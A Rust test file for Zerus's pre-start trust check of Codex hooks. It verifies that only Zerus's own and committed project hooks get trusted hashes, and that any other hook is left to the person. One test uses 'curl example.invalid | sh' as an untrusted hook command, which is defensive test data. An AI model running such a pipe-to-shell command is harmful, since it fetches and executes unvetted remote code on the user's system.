//! The pre-start trust check against Codex 0.170.0's own `hooks/list` answer,
//! as a real app server gave it (paths made synthetic): Zerus's own hooks in
//! the account's `hooks.json` (SessionStart, SessionEnd, Stop and Interrupt;
//! Codex caps the SessionEnd and Interrupt timeouts at three seconds and warns
//! that it did) and the repository's committed Beads hooks. Zerus's entries
//! are this installation's, from its own producers: the command and the
//! matcher group the writer puts in the account's file.
use super::*;

const LISTED: &str = include_str!("../../../../../tests/fixtures/codex-hooks-list-0.170.0.json");
const ACCOUNT: &str = "/work/account";
const FIXTURE_COMMAND: &str = "/opt/zerus/bin/hgs __state hook";

/// An account at a synthetic path with this installation's entry.
struct Account {
    _temp: tempfile::TempDir,
    home: PathBuf,
    expected: Expected,
}

fn account() -> Account {
    let temp = tempfile::tempdir().unwrap();
    let home = crate::platform::canonical(temp.path()).unwrap();
    let expected = Expected::current(&home).unwrap();
    Account {
        _temp: temp,
        home,
        expected,
    }
}

impl Account {
    /// The capture, its account paths and Zerus's command made this
    /// account's and this installation's.
    fn answer(&self) -> Value {
        let mut answer: Value = serde_json::from_str(LISTED).unwrap();
        let home = self.home.to_str().unwrap();
        let entry = &mut answer["result"]["data"][0];
        for hook in entry["hooks"].as_array_mut().unwrap() {
            for field in ["key", "sourcePath"] {
                let text = hook[field].as_str().unwrap().replace(ACCOUNT, home);
                hook[field] = json!(text);
            }
            if hook["command"] == FIXTURE_COMMAND {
                hook["command"] = json!(self.expected.command);
            }
        }
        for warning in entry["warnings"].as_array_mut().unwrap() {
            *warning = json!(warning.as_str().unwrap().replace(ACCOUNT, home));
        }
        answer
    }

    fn hooks(&self) -> Vec<Value> {
        listed(&self.answer(), Path::new("/work/repository"))
            .unwrap()
            .0
    }

    /// The account's `hooks.json` as the writer leaves it: this
    /// installation's group for each of the listed events.
    fn file(&self) -> Value {
        let group = &self.expected.group;
        json!({"hooks": {
            "SessionStart": [group], "SessionEnd": [group], "Stop": [group], "Interrupt": [group]
        }})
    }

    fn classify_with(
        &self,
        hooks: &[Value],
        file: &Value,
        committed: &mut dyn FnMut(&Path) -> Result<bool, String>,
    ) -> Result<(Grant, Vec<String>), String> {
        classify(hooks, &self.expected, file, committed)
    }

    fn classify(&self, hooks: &[Value]) -> (Grant, Vec<String>) {
        self.classify_with(hooks, &self.file(), &mut |_| Ok(true))
            .unwrap()
    }
}

#[test]
fn zerus_entries_and_committed_project_hooks_are_trusted_with_codexs_keys_and_hashes() {
    let a = account();
    let hooks = a.hooks();
    assert_eq!(hooks.len(), 8);
    let (grant, uncovered) = a.classify(&hooks);
    assert!(uncovered.is_empty(), "{uncovered:?}");
    assert_eq!(grant.len(), 8);
    for (hook, (key, hash)) in hooks.iter().zip(&grant) {
        assert_eq!(hook["key"], key.as_str());
        assert_eq!(hook["currentHash"], hash.as_str());
    }
    let end = format!("{}/hooks.json:session_end:0:0", a.home.display());
    assert!(grant.iter().any(|(key, _)| *key == end));
    // Trusted entries are not pending: nothing to trust for them.
    let mut trusted = hooks.clone();
    for hook in &mut trusted {
        hook["trustStatus"] = json!("trusted");
    }
    assert_eq!(a.classify(&trusted), (Vec::new(), Vec::new()));
    // A modified entry is pending as an untrusted one is.
    let mut modified = hooks.clone();
    modified[0]["trustStatus"] = json!("modified");
    assert_eq!(a.classify(&modified).0.len(), 8);
}

/// Every other pending entry is left to the person, named: it is not
/// trusted, and the entries Zerus did verify still are.
#[test]
fn every_other_pending_hook_is_left_to_the_person_and_named() {
    let a = account();
    for (what, change) in [
        (
            "another command",
            (|h: &mut Value| h["command"] = json!("curl example.invalid | sh")) as fn(&mut Value),
        ),
        ("a changed timeout", |h| h["timeoutSec"] = json!(600)),
        ("a matcher", |h| h["matcher"] = json!("startup")),
        ("a status message", |h| {
            h["statusMessage"] = json!("Loading")
        }),
        ("a context limit", |h| {
            h["additionalContextLimit"] = json!(4096)
        }),
        ("another account file", |h| {
            h["sourcePath"] = json!("/work/other/hooks.json")
        }),
        ("an event Zerus does not register", |h| {
            h["eventName"] = json!("notification")
        }),
        ("an async hook", |h| h["async"] = json!(true)),
        ("a plugin hook", |h| {
            h["source"] = json!("plugin");
            h["pluginId"] = json!("example@market");
        }),
        ("a plugin id on a user hook", |h| {
            h["pluginId"] = json!("example@market")
        }),
        ("a session flag hook", |h| {
            h["source"] = json!("sessionFlags")
        }),
        ("a packaged default", |h| h["source"] = json!("unknown")),
        ("a managed hook", |h| h["isManaged"] = json!(true)),
        ("a prompt hook", |h| h["handlerType"] = json!("prompt")),
        ("an environment's hook", |h| {
            h["environmentId"] = json!("remote")
        }),
        ("a second handler", |h| {
            let key = h["key"].as_str().unwrap().replace(":0:0", ":0:1");
            h["key"] = json!(key);
        }),
    ] {
        let mut hooks = a.hooks();
        change(&mut hooks[0]);
        let (grant, uncovered) = a.classify(&hooks);
        assert_eq!((grant.len(), uncovered.len()), (7, 1), "{what}");
        assert!(
            !grant.iter().any(|(key, _)| *key == hooks[0]["key"]),
            "{what}"
        );
        assert!(
            uncovered[0].contains(hooks[0]["sourcePath"].as_str().unwrap()),
            "{what} names the entry: {uncovered:?}"
        );
    }
}

/// Codex hashes the whole matcher group it read, so the group in the
/// account's file is compared whole: a field Codex's listing does not show,
/// such as a context limit, another handler or another group, is not Zerus's
/// entry.
#[test]
fn zeruss_entry_is_its_whole_group_in_the_accounts_file() {
    let a = account();
    let hooks = a.hooks();
    let start = |file: &Value| {
        a.classify_with(&hooks, file, &mut |_| Ok(true))
            .unwrap()
            .1
            .iter()
            .filter(|named| named.contains("sessionStart"))
            .count()
    };
    assert_eq!(start(&a.file()), 0);
    for (what, change) in [
        (
            "a context limit",
            (|g: &mut Value| g["hooks"][0]["additionalContextLimit"] = json!(4096))
                as fn(&mut Value),
        ),
        ("a status message", |g| {
            g["hooks"][0]["statusMessage"] = json!("Loading")
        }),
        ("an async run", |g| g["hooks"][0]["async"] = json!(true)),
        ("another timeout", |g| g["hooks"][0]["timeout"] = json!(5)),
        ("a matcher", |g| g["matcher"] = json!("startup")),
        ("a second handler", |g| {
            let second = g["hooks"][0].clone();
            g["hooks"].as_array_mut().unwrap().push(second);
        }),
    ] {
        let mut file = a.file();
        change(&mut file["hooks"]["SessionStart"][0]);
        assert_eq!(start(&file), 1, "{what}");
    }
    // The listed group is the one at the key's index.
    let mut file = a.file();
    let other = json!({"hooks":[{"type":"command","command":"echo other","timeout":15}]});
    file["hooks"]["SessionStart"]
        .as_array_mut()
        .unwrap()
        .insert(0, other);
    assert_eq!(start(&file), 1);
    let mut file = a.file();
    file["hooks"]
        .as_object_mut()
        .unwrap()
        .remove("SessionStart");
    assert_eq!(start(&file), 1);
    assert_eq!(start(&json!({})), 1);
}

#[test]
fn a_project_hook_not_committed_is_named_and_an_unreadable_one_stops_the_check() {
    let a = account();
    let hooks = a.hooks();
    let (grant, uncovered) = a
        .classify_with(&hooks, &a.file(), &mut |path| {
            Ok(path != Path::new("/work/repository/.codex/hooks.json"))
        })
        .unwrap();
    assert_eq!((grant.len(), uncovered.len()), (4, 4));
    assert!(uncovered.iter().any(|named| named
        == "project /work/repository/.codex/hooks.json preCompact (bd codex-hook PreCompact)"));
    assert_eq!(
        a.classify_with(&hooks, &a.file(), &mut |_| Err(
            "Git is unavailable to compare the project hooks".to_owned()
        ))
        .unwrap_err(),
        "Git is unavailable to compare the project hooks"
    );
    // A pending hook without its key or hash is not an inventory.
    let mut hooks = hooks;
    hooks[1]["currentHash"] = json!("");
    assert!(a
        .classify_with(&hooks, &a.file(), &mut |_| Ok(true))
        .unwrap_err()
        .contains("without its key or hash"));
}

/// Codex lists Zerus's SessionEnd and Interrupt entries with its own cap of
/// three seconds: that is Zerus's definition as Codex normalizes it, and
/// nothing else is.
#[test]
fn zerus_session_end_and_interrupt_are_covered_only_at_codexs_cap() {
    let a = account();
    let hooks = a.hooks();
    let end = hooks
        .iter()
        .position(|h| h["source"] == "user" && h["eventName"] == "sessionEnd")
        .unwrap();
    assert_eq!(hooks[end]["timeoutSec"], 3);
    for listed in [15, 1, 2] {
        let mut changed = hooks.clone();
        changed[end]["timeoutSec"] = json!(listed);
        assert_eq!(a.classify(&changed).1.len(), 1, "{listed}");
    }
    assert_eq!(timeout("sessionEnd", 15), 3);
    assert_eq!(timeout("interrupt", 15), 3);
    assert_eq!(timeout("stop", 15), 15);
    assert_eq!(timeout("interrupt", 2), 2);
}

#[test]
fn many_uncovered_hooks_are_named_within_a_bound() {
    let names: Vec<String> = (0..9).map(|n| format!("user x stop (other {n})")).collect();
    let text = named(&names);
    assert!(text.starts_with("user x stop (other 0); "), "{text}");
    assert!(text.ends_with("(other 4); and 4 more"), "{text}");
    assert_eq!(
        named(&names[..2]),
        "user x stop (other 0); user x stop (other 1)"
    );
}

#[test]
fn an_inventory_with_an_error_another_folder_or_missing_lists_is_not_read() {
    let a = account();
    let (hooks, warnings) = listed(&a.answer(), Path::new("/work/repository")).unwrap();
    assert_eq!((hooks.len(), warnings.len()), (8, 2));
    // Session::request hands over the answer's result itself.
    let result = a.answer()["result"].clone();
    assert_eq!(
        listed(&result, Path::new("/work/repository"))
            .unwrap()
            .0
            .len(),
        8
    );
    for (what, change) in [
        (
            "error",
            (|a: &mut Value| {
                a["result"]["data"][0]["errors"] =
                    json!([{"path":"/work/repository/.codex/hooks.json","message":"bad json"}])
            }) as fn(&mut Value),
        ),
        ("folder", |a| {
            a["result"]["data"][0]["cwd"] = json!("/work/other")
        }),
        ("two folders", |a| {
            let first = a["result"]["data"][0].clone();
            a["result"]["data"].as_array_mut().unwrap().push(first);
        }),
        ("no hooks", |a| {
            a["result"]["data"][0]["hooks"] = Value::Null
        }),
        ("no warnings list", |a| {
            a["result"]["data"][0]["warnings"] = Value::Null
        }),
        ("a warning that is not text", |a| {
            a["result"]["data"][0]["warnings"] = json!([{"message":"x"}])
        }),
        ("no result", |a| a["result"] = Value::Null),
    ] {
        let mut answer = a.answer();
        change(&mut answer);
        assert!(
            listed(&answer, Path::new("/work/repository")).is_err(),
            "{what}"
        );
    }
}

/// Only Codex's clamp of Zerus's own SessionEnd and Interrupt timeouts, in
/// the account's `hooks.json`, is a benign warning.
#[test]
fn only_codexs_clamp_of_zeruss_own_file_is_a_benign_warning() {
    let a = account();
    let (_, warnings) = listed(&a.answer(), Path::new("/work/repository")).unwrap();
    let file = a.home.join("hooks.json");
    assert_eq!(
        warnings,
        [
            format!(
                "clamping SessionEnd hook timeout to 3s in {}",
                file.display()
            ),
            format!(
                "clamping Interrupt hook timeout to 3s in {}",
                file.display()
            ),
        ]
    );
    benign(&warnings, &a.expected).unwrap();
    benign(&[], &a.expected).unwrap();
    for warning in [
        "clamping SessionEnd hook timeout to 3s in /work/repository/.codex/hooks.json".to_owned(),
        format!("clamping Stop hook timeout to 3s in {}", file.display()),
        format!("clamping SessionEnd hook timeout to 5s in {}", file.display()),
        "skipping plugin hook in /work/plugins/x/hooks.json: failed to migrate hook trust: x"
            .to_owned(),
        format!(
            "loading hooks from both {} and {}/config.toml; prefer a single representation for this layer",
            file.display(),
            a.home.display()
        ),
    ] {
        let why = benign(&[warning], &a.expected).unwrap_err();
        assert!(
            why.starts_with("Codex's hook inventory has a warning: "),
            "{why}"
        );
    }
}

/// After Codex's write, the account's configuration differs from before only
/// in the trusted keys' `trusted_hash`, whatever the formatting.
#[test]
fn the_write_changed_exactly_the_trusted_keys_and_hashes() {
    let key = "/work/account/hooks.json:session_start:0:0";
    let other = "/work/repository/.codex/hooks.json:pre_compact:0:0";
    let config = |model: &str, entries: &[(&str, &str)]| {
        let mut text = format!("model = \"{model}\"\n\n[projects.\"/work/repository\"]\ntrust_level = \"trusted\"\n\n[hooks.state]\n");
        for (key, hash) in entries {
            text.push_str(&format!("\"{key}\" = {{ trusted_hash = \"{hash}\" }}\n"));
        }
        toml_json(&text).unwrap()
    };
    let grant: Grant = vec![(key.into(), "sha256:new".into())];
    let before = config("example", &[(key, "sha256:old"), (other, "sha256:kept")]);
    let after = config("example", &[(key, "sha256:new"), (other, "sha256:kept")]);
    assert!(unchanged_except(&before, &after, &grant));
    // A first trust adds the table.
    let empty = toml_json(
        "model = \"example\"\n\n[projects.\"/work/repository\"]\ntrust_level = \"trusted\"\n",
    )
    .unwrap();
    assert!(unchanged_except(
        &empty,
        &config("example", &[(key, "sha256:new")]),
        &grant
    ));
    for (what, after) in [
        (
            "not written",
            config("example", &[(key, "sha256:old"), (other, "sha256:kept")]),
        ),
        (
            "another hash",
            config("example", &[(key, "sha256:other"), (other, "sha256:kept")]),
        ),
        (
            "another key also changed",
            config("example", &[(key, "sha256:new"), (other, "sha256:changed")]),
        ),
        (
            "an extra key trusted",
            config(
                "example",
                &[
                    (key, "sha256:new"),
                    (other, "sha256:kept"),
                    ("/x:stop:0:0", "sha256:x"),
                ],
            ),
        ),
        (
            "a trusted key removed",
            config("example", &[(key, "sha256:new")]),
        ),
        (
            "another setting changed",
            config("other", &[(key, "sha256:new"), (other, "sha256:kept")]),
        ),
    ] {
        assert!(!unchanged_except(&before, &after, &grant), "{what}");
    }
    // The rest of a trusted key's own entry is kept too.
    let mut enabled = after.clone();
    enabled["hooks"]["state"][key]["enabled"] = json!(false);
    assert!(!unchanged_except(&before, &enabled, &grant));
    // Dotted headers read the same as inline tables.
    let dotted = toml_json(&format!(
        "model = \"example\"\n[projects.\"/work/repository\"]\ntrust_level = \"trusted\"\n[hooks.state.\"{key}\"]\ntrusted_hash = \"sha256:new\"\n[hooks.state.\"{other}\"]\ntrusted_hash = \"sha256:kept\"\n"
    ))
    .unwrap();
    assert_eq!(dotted, after);
    assert!(toml_json("[hooks").is_err());
    assert_eq!(toml_json("").unwrap(), json!({}));
}

/// The version Codex's `config/read` reports for the user layer is the one
/// the write expects; an answer without it is not read.
#[test]
fn the_write_expects_the_user_layers_version() {
    let read = json!({"config":{},"origins":{},"layers":[
        {"name":{"type":"system","file":"/etc/codex/config.toml"},"version":"sha256:system","config":{}},
        {"name":{"type":"user","file":"/work/account/config.toml"},"version":"sha256:user","config":{}}
    ]});
    assert_eq!(user_version(&read).unwrap(), "sha256:user");
    for layers in [json!([]), json!(null), json!([{"name":{"type":"user"}}])] {
        let mut read = read.clone();
        read["layers"] = layers;
        assert!(user_version(&read).is_err());
    }
}

/// The project file must be the base commit's, byte for byte, in the
/// member's worktree or in the main checkout Codex reads for a linked one.
#[test]
fn a_project_hook_file_is_covered_only_as_the_base_commit_has_it() {
    let temp = tempfile::tempdir().unwrap();
    let root = crate::platform::canonical(temp.path()).unwrap();
    let git = |at: &Path, args: &[&str]| {
        let out = std::process::Command::new("git")
            .arg("-C")
            .arg(at)
            .args([
                "-c",
                "user.email=review@example.invalid",
                "-c",
                "user.name=review",
                "-c",
                "core.hooksPath=/dev/null",
                "-c",
                "commit.gpgSign=false",
            ])
            .args(args)
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "{args:?}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        String::from_utf8(out.stdout).unwrap()
    };
    let main = root.join("repo");
    std::fs::create_dir_all(main.join(".codex")).unwrap();
    git(&main, &["init", "-q"]);
    std::fs::write(main.join(".codex/hooks.json"), "{\"hooks\":{}}\n").unwrap();
    std::fs::write(main.join("README"), "fixture\n").unwrap();
    git(&main, &["add", "."]);
    git(&main, &["commit", "-qm", "base"]);
    let base = git(&main, &["rev-parse", "HEAD"]).trim().to_owned();
    git(&main, &["worktree", "add", "-q", "--detach", "../member"]);
    let member = root.join("member");
    let check = |path: &Path| committed(path, &member, Some(&main), &base).unwrap();
    assert!(check(&member.join(".codex/hooks.json")));
    assert!(check(&main.join(".codex/hooks.json")));
    // A member edits its worktree's hooks: no longer the base's.
    std::fs::write(
        member.join(".codex/hooks.json"),
        "{\"hooks\":{\"Stop\":[]}}\n",
    )
    .unwrap();
    assert!(!check(&member.join(".codex/hooks.json")));
    // The main checkout moved on after the base.
    std::fs::write(
        main.join(".codex/hooks.json"),
        "{\"hooks\":{\"Stop\":[]}}\n",
    )
    .unwrap();
    git(&main, &["commit", "-qam", "later"]);
    assert!(!check(&main.join(".codex/hooks.json")));
    // A file the base commit does not have, or outside `.codex`.
    std::fs::write(member.join(".codex/config.toml"), "[hooks]\n").unwrap();
    assert!(!check(&member.join(".codex/config.toml")));
    assert!(!check(&member.join("README")));
    assert!(!check(&root.join("elsewhere/.codex/hooks.json")));
    // A symlink spelling of the worktree is the worktree.
    let spelling = root.join("spelling");
    std::os::unix::fs::symlink(&member, &spelling).unwrap();
    std::fs::write(member.join(".codex/hooks.json"), "{\"hooks\":{}}\n").unwrap();
    assert!(check(&spelling.join(".codex/hooks.json")));
}

#[test]
fn zerus_events_are_spelled_as_codex_lists_them() {
    assert_eq!(camel("SessionStart"), "sessionStart");
    assert_eq!(camel("PreToolUse"), "preToolUse");
    assert_eq!(pascal("sessionStart"), "SessionStart");
    assert_eq!(pascal("userPromptSubmit"), "UserPromptSubmit");
    let a = account();
    let listed: Vec<_> = a
        .hooks()
        .iter()
        .map(|h| h["eventName"].as_str().unwrap().to_owned())
        .collect();
    assert!(listed.contains(&camel("SessionStart")) && listed.contains(&camel("PreCompact")));
    assert!(a.expected.events.contains(&camel("SessionEnd")));
}

fn start<'a>(home: &'a Path) -> Start<'a> {
    Start {
        team: "team-1",
        member: "m1",
        person: "person-1",
        machine: "machine-1",
        launch: "launch-1",
        session: "codex/example/m1",
        run: "run-1",
        conversation: "conversation-1",
        folder: "/work/repository",
        base: "0123456789abcdef0123456789abcdef01234567",
        home,
    }
}

/// The journal's record of a pre-trust, as `before_start` writes it, is the
/// hook kind's own question: admitted only by that kind, only for Codex, with
/// no answer and its own category, once for the same keys and hashes; a new
/// run's record without a conversation is admitted too.
#[test]
fn the_journal_record_is_the_hook_kinds_own_question() {
    use crate::approval_log::{self, TeamKind};
    let dir = tempfile::tempdir().unwrap();
    let mut db = approval_log::open(&dir.path().join("audit")).unwrap();
    let a = account();
    let grant = a.classify(&a.hooks()).0;
    let payload = |start: &Start, grant: &Grant, provider: &str| {
        json!({"host":start.machine,"session":start.session,"provider":provider,
            "question":journal_question(start, grant)})
    };
    let resumed = start(&a.home);
    let mut launched = start(&a.home);
    launched.run = "launch-1";
    launched.conversation = "";
    for s in [&resumed, &launched] {
        let p = payload(s, &grant, "codex");
        assert_eq!(p["question"]["hooks"].as_array().unwrap().len(), 8);
        assert_eq!(approval_log::begin(&mut db, &p).unwrap()["eligible"], false);
        assert_eq!(
            approval_log::begin_team(&mut db, &p, TeamKind::FolderTrust).unwrap()["eligible"],
            false
        );
        for provider in ["claude", "kimi"] {
            assert_eq!(
                approval_log::begin_team(
                    &mut db,
                    &payload(s, &grant, provider),
                    TeamKind::HookTrust
                )
                .unwrap()["eligible"],
                false
            );
        }
        let reserved = approval_log::begin_team(&mut db, &p, TeamKind::HookTrust).unwrap();
        assert_eq!(
            (reserved["fresh"].clone(), reserved["answers"].clone()),
            (json!(true), json!([]))
        );
        assert_eq!(
            approval_log::begin_team(&mut db, &p, TeamKind::HookTrust).unwrap()["fresh"],
            false
        );
    }
    // Another set of hashes is another record.
    let mut other = grant.clone();
    other[0].1 = "sha256:other".into();
    assert_eq!(
        approval_log::begin_team(
            &mut db,
            &payload(&resumed, &other, "codex"),
            TeamKind::HookTrust
        )
        .unwrap()["fresh"],
        true
    );
    for (what, change) in [
        (
            "an answerable question",
            (|q: &mut Value| q["can_answer"] = json!(true)) as fn(&mut Value),
        ),
        ("Codex's own card", |q| {
            q["source"] = json!("codex_hooks_trust")
        }),
        ("no hooks", |q| q["hooks"] = json!([])),
        ("a hook without its hash", |q| {
            q["hooks"][0] = json!({"key": q["hooks"][0]["key"]})
        }),
        ("a hash of another kind", |q| {
            q["hooks"][0]["hash"] = json!("md5:x")
        }),
        ("an extra field", |q| q["hooks"][0]["trusted"] = json!(true)),
        ("another identity", |q| {
            q["question_id"] = json!("trust:launch-1")
        }),
        ("another item", |q| q["questions"][0]["id"] = json!("trust")),
    ] {
        let mut p = payload(&resumed, &grant, "codex");
        change(&mut p["question"]);
        assert_eq!(
            approval_log::begin_team(&mut db, &p, TeamKind::HookTrust).unwrap()["eligible"],
            false,
            "{what}"
        );
    }
    let mut saved = db
        .prepare("SELECT question FROM attempts ORDER BY id")
        .unwrap();
    let categories: Vec<Value> = saved
        .query_map([], |r| r.get::<_, String>(0))
        .unwrap()
        .map(|raw| serde_json::from_str::<Value>(&raw.unwrap()).unwrap()["categories"].clone())
        .collect();
    assert_eq!(categories, vec![json!(["team_hook_trust"]); 3]);
}

/// The journal record as the desktop client reads it (zerus-f67qp review):
/// committed as the fixture client/core's detail test reads, whose output the
/// Russian journal test reads in turn. Regenerate with
/// HGS_F67QP_WRITE_FIXTURE set.
#[test]
fn the_journal_record_is_the_committed_client_fixture() {
    let answer: Value = serde_json::from_str(LISTED).unwrap();
    let grant: Grant = listed(&answer, Path::new("/work/repository"))
        .unwrap()
        .0
        .iter()
        .map(|h| {
            (
                h["key"].as_str().unwrap().to_owned(),
                h["currentHash"].as_str().unwrap().to_owned(),
            )
        })
        .collect();
    let home = PathBuf::from(ACCOUNT);
    let produced = json!({
        "question": journal_question(&start(&home), &grant),
        "approved_detail": SAVED,
        "unknown_detail": NOT_SAVED,
    });
    let path = concat!(
        env!("CARGO_MANIFEST_DIR"),
        "/tests/fixtures/team-hook-trust-record.json"
    );
    if std::env::var_os("HGS_F67QP_WRITE_FIXTURE").is_some() {
        std::fs::write(
            path,
            serde_json::to_string_pretty(&produced).unwrap() + "\n",
        )
        .unwrap();
    }
    let committed: Value = serde_json::from_str(&std::fs::read_to_string(path).unwrap()).unwrap();
    assert_eq!(
        produced, committed,
        "the journal record drifted; regenerate with HGS_F67QP_WRITE_FIXTURE"
    );
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "run with the isolated Codex app-server fixture"]
fn native_prestart_writes_the_exact_hook_audit_and_never_repeats_it() {
    assert_eq!(
        std::env::var("HGS_F67QP_ISOLATED_NATIVE").as_deref(),
        Ok("1")
    );
    let temp = tempfile::tempdir().unwrap();
    let root = crate::platform::canonical(temp.path()).unwrap();
    let home = root.join("account");
    let folder = root.join("folder");
    std::fs::create_dir(&home).unwrap();
    std::fs::create_dir(&folder).unwrap();
    std::fs::write(home.join("config.toml"), "[features]\nplugins = false\n").unwrap();

    let config = crate::config::Config {
        home: root.to_str().unwrap().to_owned(),
        dir: root.join("config"),
        state: root.join("state"),
        selves: vec![],
        peers: vec![],
        base_peers: vec![],
        peers_from_environment: false,
        machines: Default::default(),
        tab: false,
        tab_colors: String::new(),
    };
    let start = Start {
        team: "fixture-team",
        member: "m1",
        person: "fixture-person",
        machine: "fixture-machine",
        launch: "fixture-launch",
        session: "codex/fixture/member",
        run: "fixture-launch",
        conversation: "",
        folder: folder.to_str().unwrap(),
        base: "",
        home: &home,
    };

    crate::state::install_codex_hooks(&home, "codex").unwrap();
    let prepared = prepare(&home, &folder, None, "").unwrap();
    // The fresh account receives the 11 common events plus Codex Interrupt.
    assert_eq!(prepared.grant.len(), 12);
    assert!(prepared.uncovered.is_empty());
    let grant = prepared.grant.clone();
    drop(prepared);
    assert_eq!(
        before_start(&config, &start),
        Pretrust::Trusted(grant.len())
    );

    let stored = super::config(&home).unwrap();
    assert_eq!(stored["hooks"]["state"].as_object().unwrap().len(), 12);
    for (key, hash) in &grant {
        assert_eq!(stored["hooks"]["state"][key]["trusted_hash"], hash.as_str());
    }
    assert_eq!(before_start(&config, &start), Pretrust::Nothing);

    let audit = crate::approval_log::open(&config.state.join("approval-audit")).unwrap();
    let count: usize = audit
        .query_row("SELECT count(*) FROM attempts", [], |r| r.get(0))
        .unwrap();
    assert_eq!(count, 1);
    let (provider, session, status, detail, raw): (String, String, String, String, String) = audit
        .query_row(
            "SELECT provider,session,status,detail,question FROM attempts",
            [],
            |r| Ok((r.get(0)?, r.get(1)?, r.get(2)?, r.get(3)?, r.get(4)?)),
        )
        .unwrap();
    assert_eq!(
        (
            provider.as_str(),
            session.as_str(),
            status.as_str(),
            detail.as_str()
        ),
        ("codex", start.session, "approved", SAVED),
    );
    let row: Value = serde_json::from_str(&raw).unwrap();
    assert_eq!(row["question"], journal_question(&start, &grant));
    assert_eq!(row["categories"], json!(["team_hook_trust"]));
    assert_eq!(row["answers"], json!([]));
    assert!(row.get("scope").is_none());
    println!(
        "ZERUS_HOOK_TRUST_NATIVE={}",
        json!({"provider": provider, "status": status, "detail": detail, "saved_question": row["question"],
               "source": row["question"]["source"], "categories": row["categories"], "answers": row["answers"],
               "scope": null, "trusted_hashes": stored["hooks"]["state"]})
    );
}
